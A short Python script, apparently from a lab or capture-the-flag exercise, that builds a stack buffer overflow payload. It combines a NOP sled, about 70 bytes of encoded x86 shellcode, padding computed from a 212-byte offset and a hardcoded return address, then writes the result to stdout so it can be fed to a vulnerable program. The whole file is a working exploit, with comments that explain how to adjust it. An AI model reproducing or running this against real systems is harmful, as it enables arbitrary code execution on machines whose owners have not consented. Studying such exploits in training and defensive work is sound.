
import sys

shellcode =  b""
shellcode += b"\xd9\xc5\xd9\x74\x24\xf4\x5a\x29\xc9\xbe\x74\x42"
shellcode += b"\xe0\x17\xb1\x0b\x31\x72\x1a\x03\x72\x1a\x83\xea"
shellcode += b"\xfc\xe2\x81\x28\xeb\x4f\xf0\xff\x8d\x07\x2f\x63"
shellcode += b"\xdb\x3f\x47\x4c\xa8\xd7\x97\xfa\x61\x4a\xfe\x94"
shellcode += b"\xf4\x69\x52\x81\x0f\x6e\x52\x51\x3f\x0c\x3b\x3f"
shellcode += b"\x10\xa3\xd3\xbf\x39\x10\xaa\x21\x08\x16"

offset = 212            # Offset obtained at the beginning
nops = b"\x90" * 100    # Add some NOPs to secure the execution
padding = b"\x41" * 42  # padding = Offset - NOPS - Shellcode (212-100-70 = 42)

# 0xffffd12c EN little endian

eip = b"\x2c\xd1\xff\xff"  # Adjust with real val

payload = nops + shellcode + padding + eip

sys.stdout.buffer.write(payload)